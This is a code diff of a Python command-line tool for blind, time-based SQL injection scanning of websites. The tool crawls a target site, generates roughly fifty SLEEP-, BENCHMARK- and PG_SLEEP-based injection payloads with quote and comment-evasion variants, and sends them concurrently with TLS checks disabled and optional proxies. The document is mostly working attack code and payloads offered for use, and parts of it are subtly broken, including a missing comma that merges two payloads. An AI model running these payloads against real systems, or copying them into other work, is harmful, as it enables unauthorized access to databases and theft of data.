@@ -1,283 +1,363 @@
-import requests
 import argparse
+import requests
+import concurrent.futures
+from colorama import Fore, Style, init
 import time
-from urllib.parse import urljoin, urlparse, parse_qs, urlencode
-from bs4 import BeautifulSoup
-import threading
-import re
+import sys
+from urllib.parse import urlparse, urljoin
 import csv
 import json
+import logging
+import random
+from requests.exceptions import RequestException, Timeout
+import urllib3
+import sqlite3
+from bs4 import BeautifulSoup
+import matplotlib.pyplot as plt
+from sklearn.cluster import KMeans
+import numpy as np
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
 
-TIME_BASED_XOR_PAYLOADS = [
-    "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'X",
-    "0\"XOR(if(now()=sysdate(),sleep(10),0))XOR\"Z",
-    "' AND (SELECT 8839 FROM (SELECT(SLEEP(5)))uzIY) AND 'mSUA'='mSUA",
-    "'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z",
-    "X'XOR(if(now()=sysdate(),/**/sleep(5)/**/,0))XOR'X",
-    "X'XOR(if(now()=sysdate(),(sleep((((5))))),0))XOR'X",
-    "X'XOR(if((select now()=sysdate()),BENCHMARK(1000000,md5('xyz')),0))XOR'X",
-    "'XOR(SELECT(0)FROM(SELECT(SLEEP(9)))a)XOR'Z",
-    "(SELECT(0)FROM(SELECT(SLEEP(6)))a)",
-    "'XOR(if(now()=sysdate(),sleep(5*5),0))OR'",
-    "'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'",
-    "1 AND (SELECT(0)FROM(SELECT(SLEEP(9)))a)-- wXyW",
-    "(SELECT * FROM (SELECT(SLEEP(5)))a)",
-    "'%2b(select*from(select(sleep(5)))a)%2b'",
-    "CASE//WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END",
-    "';(SELECT 4564 FROM PG_SLEEP(5))--",
-    "[')//OR//MID(0x352e362e33332d6c6f67,1,1)//LIKE//5//%23']",
-    "DBMS_PIPE.RECEIVE_MESSAGE(%5BINT%5D,5)%20AND%20'bar'='bar",
-    "AND 5851=DBMS_PIPE.RECEIVE_MESSAGE([INT],5) AND 'bar'='bar",
-    "1' AND (SELECT 6268 FROM (SELECT(SLEEP(5)))ghXo) AND 'IKlK'='IKlK",
-    "(select*from(select(sleep(20)))a)",
-    "'%2b(select*from(select(sleep(0)))a)%2b'",
-    "*'XOR(if(2=2,sleep(10),0))OR'",
-    "-1' or 1=IF(LENGTH(ASCII((SELECT USER())))>13, 1, 0)--//",
-    "'+(select*from(select(if(1=1,sleep(20),false)))a)+'",
-    "2021 AND (SELECT 6868 FROM (SELECT(SLEEP(32)))IiOE)",
-    "BENCHMARK(10000000,MD5(CHAR(116)))",
-    "'%2bbenchmark(10000000%2csha1(1))%2b'",
-    "0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z",
-    "0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z",
-    "if(now()=sysdate(),sleep(5),0)",
-    "'XOR(if(now()=sysdate(),sleep(5),0))XOR'",
-    "'XOR(if(now()=sysdate(),sleep(5*1),0))OR'",
-    "0'|(IF((now())LIKE(sysdate()),SLEEP(1),0))|'Z",
-    "0'or(now()=sysdate()&&SLEEP(1))or'Z",
-    "if(now()=sysdate(),sleep(5),0)/'XOR(if(now()=sysdate(),sleep(5),0))OR'",
-    "'XOR(if(now()=sysdate(),sleep(5),0))OR'\"XOR(if(now()=sysdate(),sleep(5),0))OR\"",
-    "if(1=1,sleep(5),0)/*'XOR(if(1=1,sleep(5),0))OR'",
-    "SLEEP(5)/*' or SLEEP(5) or '\" or SLEEP(5) or \"*/",
-    "XOR(if(1337=1337,sleep(5),0))OR\"",
-    "0%27XOR(if(now()=sysdate(),sleep(9),0))XOR%27Z",
-    "AND 5851=DBMS_PIPE.RECEIVE_MESSAGE([INT],5) AND 'bar'='bar",
-    "(select(0)from(select(sleep(5)))v)%2f",
-    "'(select(0)from(select(sleep(5)))v)",
-    "'+\"+(select(0)from(select(sleep(5)))v)+\"*/'"
-]
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+init(autoreset=True)  # Initialize colorama
 
-class TimeBasedSQLiTester:
+BANNER = f"""{Fore.CYAN}
+ ____   ____   ___   _     ___   ___   ___  
+| __ ) / ___| / _ \ | |   |_ _| |__ \ / _ \ 
+|  _ \ \___ \| | | || |    | |    ) | | | |
+| |_) | ___) | |_| || |___ | |   / /| |_| |
+|____/ |____/ \__\_\|_____|___| |____\\___/ 
+                                         
+        Advanced SQL Injection Tester By a7t0fwa7 inspired from Coffinxp
+{Style.RESET_ALL}"""
+
+class AdvancedSQLiTester:
     def __init__(self, config):
         self.config = config
+        self.urls = [config.url] if config.url else []
+        self.payloads = []
         self.results = []
-        self.lock = threading.Lock()
+        self.setup_session()
+        self.setup_logging()
+        self.setup_database()
 
-    def test_payload(self, url, payload):
-        try:
-            # Generate URL variations
-            urls_to_test = self.generate_url_variations(url, payload)
+    def setup_session(self):
+        self.session = requests.Session()
+        retries = Retry(total=3, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
+        adapter = HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=retries)
+        self.session.mount('http://', adapter)
+        self.session.mount('https://', adapter)
 
-            for full_url in urls_to_test:
-                try:
-                    # Prepare the request with different payload placements
-                    self.send_request(full_url, payload)
-                except requests.exceptions.RequestException as e:
-                    print(f"Request to {full_url} failed: {e}")
-        except Exception as e:
-            print(f"An error occurred: {e}")
+    def setup_logging(self):
+        level = logging.DEBUG if self.config.verbose else logging.INFO
+        logging.basicConfig(level=level, format='%(asctime)s - %(levelname)s - %(message)s')
 
-    def generate_url_variations(self, url, payload):
-        variations = []
-        parsed_url = urlparse(url)
-        path_parts = parsed_url.path.strip('/').split('/')
+    def setup_database(self):
+        if self.config.use_db:
+            self.conn = sqlite3.connect('sqli_results.db')
+            self.cursor = self.conn.cursor()
+            self.cursor.execute('''CREATE TABLE IF NOT EXISTS results
+                                (url TEXT, vulnerable BOOLEAN, response_time REAL, status_code INTEGER, content_length INTEGER)''')
+
+    def crawl_website(self, base_url):
+        logging.info(f"Crawling website: {base_url}")
+        visited = set()
+        to_visit = [base_url]
         
-        # Insert payload in various parts of the path
-        for i in range(len(path_parts) + 1):
-            new_path = '/'.join(path_parts[:i] + [payload] + path_parts[i:])
-            variations.append(urljoin(url, parsed_url._replace(path=new_path).geturl()))
+        while to_visit:
+            url = to_visit.pop(0)
+            if url in visited:
+                continue
+            visited.add(url)
+            
+            try:
+                response = self.session.get(url, timeout=self.config.timeout)
+                soup = BeautifulSoup(response.text, 'html.parser')
+                
+                # Extract links and additional resources
+                for link in soup.find_all('a'):
+                    href = link.get('href')
+                    if href:
+                        full_url = urljoin(base_url, href)
+                        if full_url.startswith(base_url) and full_url not in visited:
+                            to_visit.append(full_url)
+                
+                # Look for JSON endpoints
+                for script in soup.find_all('script', type='application/json'):
+                    json_data = script.string
+                    if json_data:
+                        # Extract potential endpoints from JSON data
+                        try:
+                            json_obj = json.loads(json_data)
+                            # Add logic to extract URLs from JSON here if applicable
+                        except json.JSONDecodeError:
+                            pass
+
+            except Exception as e:
+                logging.error(f"Error crawling {url}: {str(e)}")
         
-        # Insert payload in the query string
-        query = parse_qs(parsed_url.query)
-        query['payload'] = payload
-        encoded_query = urlencode(query, doseq=True)
-        variations.append(parsed_url._replace(query=encoded_query).geturl())
+        logging.info(f"Crawling completed. Found {len(visited)} URLs.")
+        return list(visited)
 
-        return variations
+    def generate_payloads(self):
+        logging.info("Generating payloads")
+        base_payloads = [
+            "' OR SLEEP(10)--",
+            "' UNION SELECT SLEEP(10)--",
+            "1' AND SLEEP(10)--",
+            "1 AND (SELECT * FROM (SELECT(SLEEP(10)))a)--",
+            "' AND (SELECT 9999 FROM (SELECT SLEEP(10))a)--",
+            "' XOR(if(now()=sysdate(),sleep(10),0))--",
+            "1' XOR(if(now()=sysdate(),sleep(10),0))--"
+            "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'X",
+            "0\"XOR(if(now()=sysdate(),sleep(10),0))XOR\"Z",
+            "' AND (SELECT 8839 FROM (SELECT(SLEEP(5)))uzIY) AND 'mSUA'='mSUA",
+            "'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z",
+            "X'XOR(if(now()=sysdate(),/**/sleep(5)/**/,0))XOR'X",
+            "X'XOR(if(now()=sysdate(),(sleep((((5))))),0))XOR'X",
+            "X'XOR(if((select now()=sysdate()),BENCHMARK(1000000,md5('xyz')),0))XOR'X",
+            "'XOR(SELECT(0)FROM(SELECT(SLEEP(9)))a)XOR'Z",
+            "(SELECT(0)FROM(SELECT(SLEEP(6)))a)",
+            "'XOR(if(now()=sysdate(),sleep(5*5),0))OR'",
+            "'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'",
+            "1 AND (SELECT(0)FROM(SELECT(SLEEP(9)))a)-- wXyW",
+            "(SELECT * FROM (SELECT(SLEEP(5)))a)",
+            "'%2b(select*from(select(sleep(5)))a)%2b'",
+            "CASE//WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END",
+            "';(SELECT 4564 FROM PG_SLEEP(5))--",
+            "[')//OR//MID(0x352e362e33332d6c6f67,1,1)//LIKE//5//%23']",
+            "DBMS_PIPE.RECEIVE_MESSAGE(%5BINT%5D,5)%20AND%20'bar'='bar",
+            "AND 5851=DBMS_PIPE.RECEIVE_MESSAGE([INT],5) AND 'bar'='bar",
+            "1' AND (SELECT 6268 FROM (SELECT(SLEEP(5)))ghXo) AND 'IKlK'='IKlK",
+            "(select*from(select(sleep(20)))a)",
+            "'%2b(select*from(select(sleep(0)))a)%2b'",
+            "*'XOR(if(2=2,sleep(10),0))OR'",
+            "-1' or 1=IF(LENGTH(ASCII((SELECT USER())))>13, 1, 0)--//",
+            "'+(select*from(select(if(1=1,sleep(20),false)))a)+'",
+            "2021 AND (SELECT 6868 FROM (SELECT(SLEEP(32)))IiOE)",
+            "BENCHMARK(10000000,MD5(CHAR(116)))",
+            "'%2bbenchmark(10000000%2csha1(1))%2b'",
+            "0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z",
+            "0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z",
+            "if(now()=sysdate(),sleep(5),0)",
+            "'XOR(if(now()=sysdate(),sleep(5),0))XOR'",
+            "'XOR(if(now()=sysdate(),sleep(5*1),0))OR'",
+            "0'|(IF((now())LIKE(sysdate()),SLEEP(1),0))|'Z",
+            "0'or(now()=sysdate()&&SLEEP(1))or'Z",
+            "if(now()=sysdate(),sleep(5),0)/'XOR(if(now()=sysdate(),sleep(5),0))OR'",
+            "'XOR(if(now()=sysdate(),sleep(5),0))OR'\"XOR(if(now()=sysdate(),sleep(5),0))OR\"",
+            "if(1=1,sleep(5),0)/*'XOR(if(1=1,sleep(5),0))OR'",
+            "SLEEP(5)/*' or SLEEP(5) or '\" or SLEEP(5) or \"*/",
+            "XOR(if(1337=1337,sleep(5),0))OR\"",
+            "0%27XOR(if(now()=sysdate(),sleep(9),0))XOR%27Z",
+            "AND 5851=DBMS_PIPE.RECEIVE_MESSAGE([INT],5) AND 'bar'='bar",
+            "(select(0)from(select(sleep(5)))v)%2f",
+            "'(select(0)from(select(sleep(5)))v)",
+            "'+\"+(select(0)from(select(sleep(5)))v)+\"*/'"
+        ]
+        generated = []
+        for payload in base_payloads:
+            generated.append(payload)
+            generated.append(payload.replace("'", '"'))
+            generated.append(payload.replace(" ", "/**/"))
+        logging.info(f"Generated {len(generated)} payloads")
+        return generated
 
-    def send_request(self, url, payload):
+    def perform_request(self, url, payload):
+        url_with_payload = urljoin(url, payload)
         start_time = time.time()
 
-        # Prepare the request
-        headers = self.config.headers.copy()
-        headers['User-Agent'] = headers.get('User-Agent', '') + payload
-        
-        cookies = self.config.cookies.copy()
-        cookies['payload'] = payload
+        headers = {
+            'User-Agent': self.config.user_agent,
+            'Cookie': f'cookie={self.config.cookie}' if self.config.cookie else ''
+        }
 
-        body = self.config.json_body.copy()
-        if body:
-            body['payload'] = payload
+        proxies = {'http': self.config.proxy, 'https': self.config.proxy} if self.config.proxy else None
 
         try:
-            r = requests.get(url, cookies=cookies, headers=headers, proxies=self.config.proxies, timeout=self.config.timeout)
-        except requests.exceptions.RequestException:
-            r = requests.post(url, json=body, headers=headers, cookies=cookies, proxies=self.config.proxies, timeout=self.config.timeout)
+            if self.config.delay:
+                time.sleep(random.uniform(0, self.config.delay))
 
-        response_time = time.time() - start_time
-        vulnerable = response_time > self.config.sleep_time
+            with self.session.get(url_with_payload, headers=headers, proxies=proxies, 
+                                  timeout=self.config.timeout, verify=False, stream=True) as response:
+                response_time = time.time() - start_time
+                content_length = int(response.headers.get('Content-Length', 0))
 
-        with self.lock:
+                is_vulnerable = response_time >= 10
+                result = {
+                    'url': url_with_payload,
+                    'vulnerable': is_vulnerable,
+                    'response_time': response_time,
+                    'status_code': response.status_code,
+                    'content_length': content_length
+                }
+                self.results.append(result)
+                logging.debug(f"Tested: {url_with_payload} - Vulnerable: {is_vulnerable}")
+
+                if self.config.use_db:
+                    self.cursor.execute("INSERT INTO results VALUES (?, ?, ?, ?, ?)",
+                                        (result['url'], result['vulnerable'], result['response_time'], result['status_code'], result['content_length']))
+                    self.conn.commit()
+
+                return result
+        except Timeout:
+            logging.warning(f"Timeout occurred for {url_with_payload}")
             self.results.append({
-                'url': url,
-                'payload': payload,
-                'vulnerable': vulnerable,
-                'response_time': response_time,
-                'status_code': r.status_code,
-                'content_length': len(r.content)
+                'url': url_with_payload,
+                'vulnerable': False,
+                'response_time': self.config.timeout,
+                'status_code': 'Timeout',
+                'error': 'Request timed out'
             })
+        except RequestException as e:
+            logging.error(f"Error testing {url_with_payload}: {str(e)}")
+            self.results.append({
+                'url': url_with_payload,
+                'vulnerable': False,
+                'response_time': 0,
+                'status_code': 'Error',
+                'error': str(e)
+            })
+        return None
 
     def run(self):
-        urls_to_test = [self.config.url] if not self.config.crawl else self.crawl(self.config.url)
-        for url in urls_to_test:
-            threads = []
-            for payload in TIME_BASED_XOR_PAYLOADS:
-                thread = threading.Thread(target=self.test_payload, args=(url, payload))
-                threads.append(thread)
-                thread.start()
-                time.sleep(self.config.delay)  # Delay between starting threads
+        if self.config.crawl:
+            self.urls = self.crawl_website(self.config.url)
+        
+        if self.config.generate_payloads:
+            self.payloads = self.generate_payloads()
+        else:
+            with open(self.config.payloads, 'r') as file:
+                self.payloads = file.read().splitlines()
 
-            for thread in threads:
-                thread.join()
+        total_requests = len(self.urls) * len(self.payloads)
+        logging.info(f"Starting tests with {len(self.urls)} URLs and {len(self.payloads)} payloads")
 
-    def crawl(self, base_url):
-        urls = set([base_url])
-        try:
-            r = requests.get(base_url, headers={'User-Agent': self.config.user_agent}, timeout=self.config.timeout)
-            soup = BeautifulSoup(r.text, 'html.parser')
-
-            # Find all links
-            for link in soup.find_all(['a', 'link'], href=True):
-                href = link['href']
-                full_url = urljoin(base_url, href)
-                if base_url in full_url and full_url not in urls:
-                    urls.add(full_url)
-
-            # Find all forms and extract action URLs
-            for form in soup.find_all('form'):
-                action = form.get('action')
-                form_url = urljoin(base_url, action)
-                if base_url in form_url and form_url not in urls:
-                    urls.add(form_url)
-
-                # Extract form parameters
-                inputs = form.find_all('input')
-                params = {}
-                for inp in inputs:
-                    name = inp.get('name')
-                    value = inp.get('value', '')
-                    if name:
-                        params[name] = value
-                if params:
-                    urls.add(self.add_params_to_url(form_url, params))
-
-            # Extract parameters from JavaScript
-            script_tags = soup.find_all('script')
-            for script in script_tags:
-                js_code = script.string
-                if js_code:
-                    urls.update(self.extract_js_urls(js_code, base_url))
-
-        except requests.exceptions.RequestException as e:
-            print(f"Failed to crawl {base_url}: {e}")
-        return list(urls)
-
-    def extract_js_urls(self, js_code, base_url):
-        js_urls = set()
-        url_patterns = re.findall(r"""(https?://[^\s'"]+|[^\s'"]+/\w+\.php\?\w+=\w+)""", js_code)
-        for pattern in url_patterns:
-            full_url = urljoin(base_url, pattern)
-            if base_url in full_url:
-                js_urls.add(full_url)
-        return js_urls
-
-    def add_params_to_url(self, url, params):
-        url_parts = list(urlparse(url))
-        query = parse_qs(url_parts[4])
-        query.update(params)
-        url_parts[4] = urlencode(query, doseq=True)
-        return urljoin(url, url_parts[2] + '?' + url_parts[4])
+        with concurrent.futures.ThreadPoolExecutor(max_workers=self.config.threads) as executor:
+            futures = [executor.submit(self.perform_request, url, payload) 
+                       for url in self.urls for payload in self.payloads]
+            
+            for _ in concurrent.futures.as_completed(futures):
+                pass
 
     def display_results(self):
+        vulnerable_count = sum(1 for result in self.results if result.get('vulnerable', False))
+        print(f"\nResults: {vulnerable_count} potentially vulnerable URLs found out of {len(self.results)} tested.")
+        
         for result in self.results:
-            status = "Vulnerable" if result['vulnerable'] else "Not Vulnerable"
-            print(f"URL: {result['url']} | Payload: {result['payload']} | Status: {status} | Response Time: {result['response_time']}s | Status Code: {result['status_code']} | Content Length: {result['content_length']}")
+            if result.get('vulnerable', False):
+                print(f"{Fore.YELLOW}✔️  SQLi Found! URL: {result['url']} - Response Time: {result['response_time']:.2f}s - Status: {result['status_code']}")
+            elif 'error' in result:
+                print(f"{Fore.RED}❌ Error. URL: {result['url']} - Error: {result['error']}")
+            else:
+                print(f"{Fore.RED}❌ Not Vulnerable. URL: {result['url']} - Response Time: {result['response_time']:.2f}s - Status: {result['status_code']}")
 
-        if self.config.generate_csv:
-            self.generate_csv_report()
-        if self.config.generate_json:
-            self.generate_json_report()
-        if self.config.generate_html:
-            self.generate_html_report()
+    def save_results(self):
+        if not self.config.output:
+            return
+        
+        extension = self.config.output.split('.')[-1].lower()
+        if extension == 'csv':
+            self._save_csv()
+        elif extension == 'json':
+            self._save_json()
+        else:
+            print(f"{Fore.RED}[Err] Unsupported output format. Use .csv or .json")
 
-    def generate_csv_report(self):
-        csv_file = 'sqli_results.csv'
-        with open(csv_file, mode='w', newline='') as file:
-            writer = csv.DictWriter(file, fieldnames=self.results[0].keys())
+    def _save_csv(self):
+        with open(self.config.output, 'w', newline='') as csvfile:
+            fieldnames = ['url', 'vulnerable', 'response_time', 'status_code', 'content_length', 'error']
+            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
             writer.writeheader()
             for result in self.results:
                 writer.writerow(result)
-        print(f"CSV report generated: {csv_file}")
+        print(f"Results saved to {self.config.output}")
 
-    def generate_json_report(self):
-        json_file = 'sqli_results.json'
-        with open(json_file, 'w') as file:
-            json.dump(self.results, file, indent=4)
-        print(f"JSON report generated: {json_file}")
+    def _save_json(self):
+        with open(self.config.output, 'w') as jsonfile:
+            json.dump(self.results, jsonfile, indent=2)
+        print(f"Results saved to {self.config.output}")
 
-    def generate_html_report(self):
-        html_file = 'sqli_results.html'
-        with open(html_file, 'w') as file:
-            file.write("<html><head><title>SQLi Test Results</title></head><body>")
-            file.write("<h1>SQL Injection Test Results</h1>")
-            file.write("<table border='1'><tr><th>URL</th><th>Payload</th><th>Vulnerable</th><th>Response Time (s)</th><th>Status Code</th><th>Content Length</th></tr>")
-            for result in self.results:
-                color = 'red' if result['vulnerable'] else 'green'
-                file.write(f"<tr style='color:{color}'><td>{result['url']}</td><td>{result['payload']}</td><td>{result['vulnerable']}</td><td>{result['response_time']:.2f}</td><td>{result['status_code']}</td><td>{result['content_length']}</td></tr>")
-            file.write("</table></body></html>")
-        print(f"HTML report generated: {html_file}")
+    def analyze_results(self):
+        response_times = [r['response_time'] for r in self.results if 'response_time' in r]
+        if len(response_times) < 2:
+            logging.warning("Not enough data for analysis")
+            return
 
-class Config:
-    def __init__(self, args):
-        self.url = args.url
-        self.sleep_time = args.sleep_time
-        self.delay = args.delay
-        self.timeout = args.timeout
-        self.user_agent = args.user_agent
-        self.cookies = {}
-        self.proxies = {}
-        self.headers = {'User-Agent': args.user_agent}
-        self.json_body = {}
-        self.crawl = args.crawl
-        self.generate_csv = args.generate_csv
-        self.generate_json = args.generate_json
-        self.generate_html = args.generate_html
+        kmeans = KMeans(n_clusters=2, random_state=0).fit([[rt] for rt in response_times])
+        
+        plt.figure(figsize=(10, 6))
+        plt.scatter(range(len(response_times)), response_times, c=kmeans.labels_)
+        plt.title('Response Time Clustering')
+        plt.xlabel('Request Number')
+        plt.ylabel('Response Time (s)')
+        plt.savefig('response_time_analysis.png')
+        print(f"Response time analysis saved to response_time_analysis.png")
 
-    def validate(self):
-        parsed_url = urlparse(self.url)
-        if not parsed_url.scheme or not parsed_url.netloc:
-            raise ValueError("Invalid URL format")
+    def close(self):
+        if self.config.use_db:
+            self.conn.close()
 
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Time-Based SQL Injection Tester")
-    parser.add_argument("--url", required=True, help="Target URL")
-    parser.add_argument("--sleep-time", type=int, default=10, help="Sleep time for the payload")
-    parser.add_argument("--delay", type=float, default=1, help="Delay between requests")
-    parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
-    parser.add_argument("--user-agent", default="SQLiTester", help="User-Agent header")
-    parser.add_argument("--crawl", action="store_true", help="Crawl the website for URLs")
-    parser.add_argument("--generate-csv", action="store_true", help="Generate CSV report")
-    parser.add_argument("--generate-json", action="store_true", help="Generate JSON report")
-    parser.add_argument("--generate-html", action="store_true", help="Generate HTML report")
+def validate_url(url):
+    parsed = urlparse(url)
+    return bool(parsed.netloc and parsed.scheme)
+
+def main():
+    parser = argparse.ArgumentParser(description="Advanced BSQLi - Perform extensive SQL injection testing.")
+    parser.add_argument("-u", "--url", help="Single URL to scan or base URL for crawling.")
+    parser.add_argument("-l", "--list", help="Text file containing a list of URLs to scan.")
+    parser.add_argument("-p", "--payloads", help="Text file containing the payloads to append to the URLs.")
+    parser.add_argument("-c", "--cookie", help="Cookie to include in the GET request.")
+    parser.add_argument("-t", "--threads", type=int, default=40, help="Number of concurrent threads")
+    parser.add_argument("-T", "--timeout", type=float, default=30, help="Timeout for each request in seconds")
+    parser.add_argument("-o", "--output", help="Output file to save results (CSV or JSON format)")
+    parser.add_argument("-ua", "--user-agent", default="BSQLi Tester", help="User-Agent string to use")
+    parser.add_argument("-x", "--proxy", help="Proxy to use for requests (e.g., http://127.0.0.1:8080)")
+    parser.add_argument("-d", "--delay", type=float, help="Add a random delay between requests (in seconds)")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
+    parser.add_argument("--crawl", action="store_true", help="Crawl the website for additional URLs")
+    parser.add_argument("--generate-payloads", action="store_true", help="Automatically generate payloads")
+    parser.add_argument("--use-db", action="store_true", help="Store results in SQLite database")
+    
     args = parser.parse_args()
 
-    config = Config(args)
-    try:
-        config.validate()  # Validate inputs
-        tester = TimeBasedSQLiTester(config)
-        tester.run()
-        tester.display_results()
-    except ValueError as ve:
-        print(f"Input validation error: {ve}")
-    except Exception as e:
-        print(f"An unexpected error occurred: {e}")
+    if not (args.url or args.list):
+        print(f"{Fore.RED}[Err] Either -u or -l is required.")
+        sys.exit(1)
 
+    if args.url and not validate_url(args.url):
+        print(f"{Fore.RED}[Err] Invalid URL provided.")
+        sys.exit(1)
+
+    if args.list:
+        try:
+            with open(args.list, 'r') as file:
+                urls = [url.strip() for url in file if validate_url(url.strip())]
+            if not urls:
+                print(f"{Fore.RED}[Err] No valid URLs found in the provided file.")
+                sys.exit(1)
+            args.url = urls[0]  # Set the first URL as the base URL for potential crawling
+        except IOError:
+            print(f"{Fore.RED}[Err] Error reading URL file.")
+            sys.exit(1)
+
+    if not args.generate_payloads and not args.payloads:
+        print(f"{Fore.RED}[Err] Either --generate-payloads or -p is required.")
+        sys.exit(1)
+
+    if args.threads <= 0:
+        print(f"{Fore.RED}[Err] Thread count must be a positive integer.")
+        sys.exit(1)
+
+    print(BANNER)
+
+    tester = AdvancedSQLiTester(args)
+    tester.run()
+    tester.display_results()
+    tester.save_results()
+    tester.analyze_results()
+    tester.close()
+
+if __name__ == "__main__":
+    main()
